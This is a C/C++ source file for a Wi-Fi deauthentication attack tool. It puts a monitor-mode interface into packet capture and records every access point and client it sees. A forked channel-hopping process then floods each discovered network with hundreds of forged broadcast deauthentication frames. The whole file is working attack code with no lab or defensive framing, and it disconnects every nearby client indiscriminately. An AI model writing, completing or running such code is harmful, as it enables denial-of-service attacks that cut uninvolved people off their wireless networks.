#include <iostream>
#include "linux.h"
#include "pcap.h"
#include <time.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>

#define NULL_MAC  (unsigned char*)"\x00\x00\x00\x00\x00\x00"
#define BROADCAST (unsigned char*)"\xFF\xFF\xFF\xFF\xFF\xFF"

const unsigned char llcnull[4] = { 0, 0, 0, 0 };

#define DEAUTH_REQ      \
	"\xC0\x00\x3A\x01\xCC\xCC\xCC\xCC\xCC\xCC\xBB\xBB\xBB\xBB\xBB\xBB" \
	"\xBB\xBB\xBB\xBB\xBB\xBB\x00\x00\x07\x00"

using namespace std;

#pragma pack(1)
typedef struct AP_INFO
{
    struct AP_INFO* prev;
    struct AP_INFO* next;

    struct ST_INFO* pApStationList;

    unsigned char bssid[6];
    int channel;
}AP_INFO,*PAP_INFO;
#pragma pack()

#pragma pack(1)
typedef struct ST_INFO
{
    struct ST_INFO* pAttackStPrev;
    struct ST_INFO* pAttackStNext;

    struct AP_INFO* pApBase;

    unsigned char stmac[6];
    int channel;
}ST_INFO,*PST_INFO;
#pragma pack()

#pragma pack(1)
typedef struct GLOBALS
{
    int attack_pipe[2];

    AP_INFO* pApFirst;
    AP_INFO* pApAttackFirst;

} GLOBALS,*PGLOBALS;
#pragma pack()

GLOBALS G;

bool send_packet(WIFI* pWifi,void* buf,size_t Count)
{
    unsigned char tmpbuf[4096];
    int sendLength;
    int ret;
	unsigned char RadioHeader[] =
	{
		0x00, 0x00, // <-- radiotap version
		0x0c, 0x00, // <- radiotap header length
		0x04, 0x80, 0x00, 0x00, // <-- bitmap
		0x00, // <-- rate
		0x00, // <-- padding for natural alignment
		0x18, 0x00, // <-- TX flags
	};

	if(Count>sizeof(tmpbuf)-22)
    {
        return false;
    }

    memcpy(tmpbuf,RadioHeader,sizeof(RadioHeader));
    memcpy(tmpbuf+sizeof(RadioHeader),buf,Count);
    sendLength=Count+sizeof(RadioHeader);

    ret=write(pWifi->fd_out,tmpbuf,sendLength);
    if(ret<0)
    {
        printf("linux write fail\n");
        return false;
    }

    return true;
}

void do_attack_deauth(unsigned char* destMac,unsigned char* bssid,WIFI* pWifi)
{
    int times;
    unsigned char h80211[4096];
    int i;

    if(!memcmp(destMac,BROADCAST,6))
    {
        times=512;
    }
    else
    {
        times=256;
    }

    for(i=0;i<times;i++)
    {
        memcpy(h80211,DEAUTH_REQ,sizeof(DEAUTH_REQ));

        memcpy(h80211+4,destMac,6);
        memcpy(h80211+10,bssid,6);
        memcpy(h80211+16,bssid,6);

        if(!send_packet(pWifi,h80211,26))
        {
            printf("send attack deauth packet fail\n");
            continue;
        }

        usleep(2000);
    }
}

void channel_hopper(WIFI* pWifi,pid_t parent_id)
{
    ssize_t unused;
    int newChannel;
    int i;
    int j;
    AP_INFO* pAttackAp=NULL;
    ST_INFO* pAttackSt=NULL;

    i=1;
    while(!kill(parent_id,0))
    {
        newChannel=(i++) % 12;
        if(!newChannel)
        {
            continue;
        }

        if(linux_set_channel(pWifi,newChannel))
        {
            pAttackAp=G.pApAttackFirst;

            while(pAttackAp)
            {
                if(pAttackAp->channel!=newChannel)
                {
                    pAttackAp=pAttackAp->next;
                    continue;
                }

                do_attack_deauth(BROADCAST, pAttackAp->bssid, pWifi);

                pAttackAp=pAttackAp->next;
            }
        }

        usleep(500000);
    }
}

void sighandler(int signum)
{
    ssize_t unused;

    unsigned char attackbuf[16];
    unsigned char bssid[6];
    unsigned char stmac[6];
    int channel;
    AP_INFO* pAttackAp_cur=NULL;
    AP_INFO* pAttackAp_prev=NULL;
    ST_INFO* pAttackSt_cur=NULL;
    ST_INFO* pAttackSt_prev=NULL;

    signal(signum,sighandler);

    if(signum==SIGUSR1)
    {
        unused=read(G.attack_pipe[0],attackbuf,sizeof(attackbuf));
        channel=*(int*)attackbuf;
        memcpy(bssid,attackbuf+4,6);
        memcpy(stmac,attackbuf+10,6);

//        if(memcmp(stmac,BROADCAST,6))
//        {
//            printf("new attack AP: %02X:%02X:%02X:%02X:%02X:%02X, ST: %02X:%02X:%02X:%02X:%02X:%02X\n",
//               bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],
//               stmac[0],stmac[1],stmac[2],stmac[3],stmac[4],stmac[5]);
//        }

        pAttackAp_cur=G.pApAttackFirst;
        pAttackAp_prev=NULL;

        while(pAttackAp_cur)
        {
            if(!memcmp(bssid,pAttackAp_cur->bssid,6))
            {
                break;
            }
            pAttackAp_prev=pAttackAp_cur;
            pAttackAp_cur=pAttackAp_cur->next;
        }

        if(!pAttackAp_cur)
        {
            if(!(pAttackAp_cur=(AP_INFO*)malloc(sizeof(AP_INFO))))
            {
                return;
            }
            memset(pAttackAp_cur,0x00,sizeof(AP_INFO));

            if(G.pApAttackFirst)
            {
                pAttackAp_prev->next=pAttackAp_cur;
            }
            else
            {
                G.pApAttackFirst=pAttackAp_cur;
            }

            memcpy(pAttackAp_cur->bssid,bssid,6);

            pAttackAp_cur->pApStationList=NULL;
            pAttackAp_cur->next=NULL;
            pAttackAp_cur->prev=pAttackAp_prev;
        }

        if(channel!=-1 && channel!=0)
        {
            pAttackAp_cur->channel=channel;
        }

        pAttackSt_cur=pAttackAp_cur->pApStationList;

        while(pAttackSt_cur)
        {
            if(!memcmp(pAttackSt_cur->stmac,stmac,6))
            {
                break;
            }

            pAttackSt_prev=pAttackSt_cur;
            pAttackSt_cur=pAttackSt_cur->pAttackStNext;
        }

        if(!pAttackSt_cur)
        {
            if(!(pAttackSt_cur=(ST_INFO*)malloc(sizeof(ST_INFO))))
            {
                return;
            }

            memset(pAttackSt_cur,0x00,sizeof(ST_INFO));
            if(pAttackAp_cur->pApStationList)
            {
                pAttackSt_prev->pAttackStNext=pAttackSt_cur;
            }
            else
            {
                pAttackAp_cur->pApStationList=pAttackSt_cur;
            }

            memcpy(pAttackSt_cur->stmac,stmac,6);
            pAttackSt_cur->pAttackStNext=NULL;
            pAttackSt_cur->pAttackStPrev=pAttackSt_prev;
        }

        pAttackSt_cur->pApBase=pAttackAp_cur;
        pAttackSt_cur->channel=pAttackAp_cur->channel;
    }
}

pid_t set_channel_hopper(WIFI* pWifi,pid_t parent_id)
{
    ssize_t unused;
    pid_t child_pid;

    unused=pipe(G.attack_pipe);

    signal(SIGUSR1,sighandler);

    if(!(child_pid=fork()))
    {
        printf("enter child process\n");
        if(!do_linux_open(pWifi))
        {
            printf("child process open linux card fail\n");
            exit(1);
        }
        channel_hopper(pWifi,parent_id);
    }

    return child_pid;
}

void dump_add_packet(unsigned char* h80211,int caplen,RX_INFO* pRx_info,pid_t child_pid)
{
    AP_INFO* pAp_cur=NULL;
    AP_INFO* pAp_prev=NULL;
    ST_INFO* pSt_cur=NULL;
    ST_INFO* pSt_prev=NULL;

    unsigned char attackbuf[16];
    unsigned char bssid[6];
    unsigned char stmac[6];
    int i,n;

    unsigned char* p;

    bool blFlsAttackList=false;

	if (caplen<24)
	{
		return;
	}

	if ((h80211[0] & 0xC)==0x04)
	{
		return;
	}

	if (caplen>28)
	{
		if (!memcmp(h80211+24,llcnull,4))
		{
			return;
		}
	}

    switch(h80211[1] & 3)
    {
    case 0:
        memcpy(bssid,h80211+16,6);
        break;
    case 1:
        memcpy(bssid,h80211+4,6);
        break;
    case 2:
        memcpy(bssid,h80211+10,6);
        break;
    case 3:
        memcpy(bssid,h80211+10,6);
        break;
    }

    if(!memcmp(bssid,BROADCAST,6))
    {
        return;
    }

    pAp_cur=G.pApFirst;
    pAp_prev=NULL;

    while(pAp_cur)
    {
        if(!memcmp(pAp_cur->bssid,bssid,6))
        {
            break;
        }

        pAp_prev=pAp_cur;
        pAp_cur=pAp_cur->next;
    }

    if(!pAp_cur)
    {
        blFlsAttackList=true;
        if(!(pAp_cur=(AP_INFO*)malloc(sizeof(AP_INFO))))
        {
            printf("error malloc AP_INFO\n");
            return;
        }

        memset(pAp_cur,0x00,sizeof(AP_INFO));
        if(G.pApFirst)
        {
            pAp_prev->next=pAp_cur;
        }
        else
        {
            G.pApFirst=pAp_cur;
        }

        memcpy(pAp_cur->bssid,bssid,6);
        pAp_cur->next=NULL;
        pAp_cur->pApStationList=NULL;
        pAp_cur->prev=pAp_prev;
    }

    switch(h80211[1] & 3)
    {
    case 0:
        if(!memcmp(h80211+10,bssid,6))
        {
            goto skip_station;
        }
        memcpy(stmac,h80211+10,6);
    case 1:
        memcpy(stmac,h80211+10,6);
        break;
    case 2:
        if((h80211[4] % 2))
        {
            goto skip_station;
        }
        memcpy(stmac,h80211+4,6);
        break;
    default:
        goto skip_station;
    }

    if(!memcmp(stmac,BROADCAST,6))
    {
        return;
    }

    pSt_cur=pAp_cur->pApStationList;
    pSt_prev=NULL;

    while(pSt_cur)
    {
        if(!memcmp(pSt_cur->stmac,stmac,6))
        {
            break;
        }

        pSt_prev=pSt_cur;
        pSt_cur=pSt_cur->pAttackStNext;
    }

    if(!pSt_cur)
    {
        blFlsAttackList=true;

        if(!(pSt_cur=(ST_INFO*)malloc(sizeof(ST_INFO))))
        {
            return;
        }
        memset(pSt_cur,0x00,sizeof(ST_INFO));

        if(pAp_cur->pApStationList)
        {
            pSt_prev->pAttackStNext=pSt_cur;
        }
        else
        {
            pAp_cur->pApStationList=pSt_cur;
        }

        memcpy(pSt_cur->stmac,stmac,6);
        pSt_cur->pAttackStNext=NULL;
        pSt_cur->pAttackStPrev=pSt_prev;
        pSt_cur->pApBase=pAp_cur;
    }

    pSt_cur->channel=pAp_cur->channel;

skip_station:
    if(h80211[0]==0x80 || h80211[0]==0x50)
	{
		p=h80211+36;
		while(p<h80211+caplen)
		{
			if (p+2+p[1]>h80211+caplen)
			{
				break;
			}

			if (p[0]==0x03)
			{
			    pAp_cur->channel=p[2];
			}

			p+=2+p[1];
		}
	}

skip_all:
    if(blFlsAttackList)
    {
		memset(attackbuf,0x00,sizeof(attackbuf));
		memcpy(attackbuf,&pAp_cur->channel,sizeof(int));
		memcpy(attackbuf+4,pAp_cur->bssid,6);
		if(pSt_cur)
        {
            memcpy(attackbuf+10,pSt_cur->stmac,6);
        }
        else
        {
            memcpy(attackbuf+10,BROADCAST,6);
        }
		write(G.attack_pipe[1], attackbuf, sizeof(attackbuf));
		kill(child_pid, SIGUSR1);
    }

    return;
}

int main()
{
    WIFI iWifi;
    int unused;
    int i=0;
    unsigned char buffer[4096]={0x00};
    int caplen;
    pid_t child_pid;
    RX_INFO rx_info;

    memset(&iWifi,0x00,sizeof(iWifi));
    memcpy(iWifi.iFaceName,"wlan1mon",64);

    if(!do_linux_open(&iWifi))
    {
        printf("open fail\n");
        return 0;
    }
    else
    {
        printf("open success\n");
    }

    child_pid=set_channel_hopper(&iWifi,getpid());
    //linux_set_channel(&iWifi,7);

    while(true)
    {
        memset(buffer,0x00,sizeof(buffer));
        memset(&rx_info,0x00,sizeof(RX_INFO));

        //do_attack_deauth((unsigned char*)BROADCAST,(unsigned char*)"\xFC\xD7\x33\xEC\xD9\x32",&iWifi);

        if((caplen=linux_read(&iWifi,buffer,sizeof(buffer),&rx_info))<0)
        {
            printf("read packet error\n");
        }
        else
        {
            dump_add_packet(buffer,caplen,&rx_info,child_pid);
            if(i++%10000==0)
            {
                printf("capturing packet\n");
            }
        }
    }

    do_linux_close(&iWifi);

    return 0;
}
